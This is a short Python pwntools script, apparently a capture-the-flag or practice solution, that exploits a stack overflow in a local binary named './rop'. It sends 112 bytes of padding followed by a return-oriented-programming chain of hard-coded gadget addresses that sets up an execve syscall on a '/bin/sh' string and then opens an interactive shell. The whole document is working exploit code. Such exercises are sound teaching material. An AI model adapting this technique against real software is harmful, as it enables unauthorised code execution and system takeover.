from pwn import *

sh = 0x080be408
pop_edx_ecx_ebx_ret = 0x0806eb90


pop_eax = 0x080bb196

int0x80 = 0x0806f22f


payload = flat([b"a"*112,pop_edx_ecx_ebx_ret, 0, 0, sh, pop_eax, 0xb, int0x80])



p = process("./rop")
p.recvuntil(b"?")
p.sendline(payload)
p.interactive()


